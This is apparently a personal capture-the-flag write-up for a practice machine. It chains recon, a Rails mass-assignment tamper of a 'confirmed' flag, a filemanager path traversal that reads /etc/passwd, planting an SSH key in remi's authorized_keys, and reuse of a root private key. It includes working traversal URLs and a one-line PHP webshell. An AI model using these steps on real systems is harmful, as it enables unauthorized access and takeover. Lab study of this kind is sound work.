My IP (tun0): 192.168.45.166
Target IP: 192.168.111.231

> Note: the target IP changes to `192.168.201.231` later on — the box got reverted between sessions and pulled a new IP. Same machine.

Route: make an account on the Rails app → Burp to tamper `user[confirmed]=true` so I confirm myself → filemanager path traversal to read `/etc/passwd` → drop my pubkey into `remi`'s `authorized_keys` → SSH in as `remi` → find a root key sitting in remi's home → SSH to `root@127.0.0.1`.

---

## Recon

```bash
nmap -sV -sC -p- 192.168.111.231
```

Output (trimmed the fingerprint-string spam):
```
PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open   http            # title: "Boolean", redirects to /login
3000/tcp  closed ppp
33017/tcp open   http    Apache httpd 2.4.38 ((Debian))   # title: "Development"
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- SSH Service (22): post initial foothold unless we upload to the keys directory
- HTTP Service (80, 33017): lets observe what we can see on the webpage
	- Found the login page. admin/admin didnt work, but it lets you create a profile — you have to confirm the account before you can move forward
	- Exhausted the normal enumeration, so use Burpsuite to analyze the requests and responses when interacting with buttons on the site
	- Search for version numbers, names, an upload directory or feature
	- gobuster

### gobuster

```bash
gobuster dir -u http://192.168.111.231 -w /usr/share/dirb/wordlists/common.txt
```
```
filemanager   (Status: 302) [--> /login]
login         (Status: 200)
register      (Status: 200)
robots.txt    (Status: 200)
```

```bash
gobuster dir -u http://192.168.111.231:33017 -w /usr/share/dirb/wordlists/common.txt
```
```
admin         (Status: 301) [--> /admin/]
cgi-bin       (Status: 301)
index.php     (Status: 200)
info          (Status: 301)
server-status (Status: 403)
```

Here we can see there are two levels of directories. A lot of the resolved directories are locked down and cant be accessed from the outside. The only thing we can really do is create an account.

Other quick checks — all nothing:
- inspect element → nothing
- page source → nothing
- Port 3000 → nothing

---

## Initial Access — Rails mass assignment → path traversal → SSH as `remi`

### Burp — finding the request that leaks the user object

Using Burpsuite I was able to view the request and response headers.

![[Pasted image 20260622185334.png|697]]

Clicking the change email button right after you click the edit button reveals this request on the left. What catches our eye is the response. We see categories filled out — email, id, username → false, and timestamps. Looking at the request, that response got generated from something, likely something after the `method` parameter.

I took that whole blob of text and sent it to the decoder.

![[Pasted image 20260622185706.png]]

Now we've got some more readable inputs. All the info in the response was likely pulled from the user — and the email matches the one we put in our input before clicking the button.

### Flipping `confirmed` back to true (mass assignment)

In the response, my confirmed state was set to false the first go around. But because of the way the Rails infrastructure works, whatever is used as an identity for us — confirmed, email, id, etc. — the vuln is that we can just change this value back. So I used `user[confirmed]=true` and turned `[confirmed]` back into URL encode (brackets are special characters in the URL bar), then sent it through. Our state comes back as confirmed, which lets us into the filemanager page.

### Filemanager — path traversal

![[Pasted image 20260622185346.png]]

Was able to get file path traversal in the search bar. I saw from a previous GitHub that there was an `index.php` file, so first I tried to find a PHP file I could upload and get simple command execution through the search bar:

```php
<?php system($_GET['cmd']); ?>
```
Tried a few paths in the search bar to see if anything would print, and ran an extra gobuster with `-x php` to look for traces of PHP files — still found nothing. Dead end.

Then I hovered my mouse over a file showing as valid in the filemanager directory, and it showed:
```
http://192.168.201.231/filemanager?cwd=&file=cmd.php&download=true
```

![[Pasted image 20260622190323.png|696]]

I noticed the `cwd`. It almost means pwd. So I figured if I can set the directory, I can go to whatever directory I want. So we went to `/etc/passwd` with:
```
http://192.168.201.231/filemanager?cwd=../../../../../etc&file=passwd&download=true
```

That lets us download the file. We dont always need to download, but to enumerate more users this step is necessary.

### Enumerate users → SSH as remi

We then find more users.

![[Pasted image 20260622190639.png]]

The only one being remi. We see their directory, so we access it with:
```
http://192.168.201.231/filemanager?cwd=../../../../../home/remi
```

In there was a `.ssh` folder, and inside there was no authorized_keys file. So we made our own with keygen.

![[Pasted image 20260622190802.png]]

```bash
# generate (a .pub and a private file both get created in that same folder)
ssh-keygen -t ed25519 -f mykey
# drop mykey.pub into /home/remi/.ssh/authorized_keys via the filemanager, then:
ssh -i mykey remi@192.168.201.231
```

→ shell as **remi**.

---

## Privilege Escalation — root key in remi's home

I was having issues getting my linpeas transfer to work, so I ended up uploading the file into a directory I could use through the web interface and then found it through the shell. I ran linpeas but it kept getting stuck after the Internet Access check:

```
╔══════════╣ Internet Access? (T1016,T1590)
Port 80 is accessible
Port 443 is not accessible
DNS is not accessible
ICMP is not accessible
^C
```

> Next time: run `linpeas.sh -s` (stealth/faster, skips the time-consuming checks) and `| tee` it to a file — the box has no internet so those egress checks just hang. See [[LinPEAS]].

So I tried running `sudo -l` and other manual commands from my list myself, and none of them were really working.

Then after watching a video, in their version their linpeas worked and they ended up at the same thing — there was a root ssh key file under `/home/remi/.ssh/keys`.

![[Pasted image 20260622191347.png]]

Accessing that file path, I assumed this command would work:
```
ssh -i root root@192.168.201.231
root@192.168.201.231's password:
Permission denied, please try again.
...
Received disconnect from 192.168.201.231 port 22:2: Too many authentication failures
```

It kept asking me for a password. Back to the video — it mentioned `-o IdentitiesOnly=yes -i root` would work, but only when I used the localhost IP from that user's machine. So the command that ended up getting me root was:
```bash
ssh -o IdentitiesOnly=yes -i root root@127.0.0.1
```

> `-o IdentitiesOnly=yes` makes ssh use only the `-i` key instead of offering every key it knows (which is what triggered the "too many authentication failures"). See [[SSH]] (Forcing a Single Key).

→ **root**.

---

## Flags

```bash
cat /home/remi/local.txt
cat /root/proof.txt
```

---

## Key Takeaways

1. When a response hands back a state flag like `confirmed`/`is_admin`/`role`, try flipping it in the request — Rails-style apps map params straight onto the model (mass assignment).
2. URL-encode the brackets in tampered params — `user[confirmed]` → `user%5Bconfirmed%5D`, or it breaks.
3. A `cwd`/`file` + `download=true` link = test for path traversal. Grab `/etc/passwd` first to enumerate users.
4. A writable filemanager = an SSH foothold — write your pubkey into a user's `authorized_keys`. Webshells only fire if the dir actually runs PHP (it didnt here).
5. `ssh -o IdentitiesOnly=yes -i <key>` avoids the "too many authentication failures" lockout, and try `127.0.0.1` from your foothold when the external login gets refused.

---

## Related Notes

- [[Port-Overview-and-Priorities]]
- [[SSH]]
- [[LinPEAS]]
- [[Linux_Priv_Esc]]
- [[SQL_Injection]]
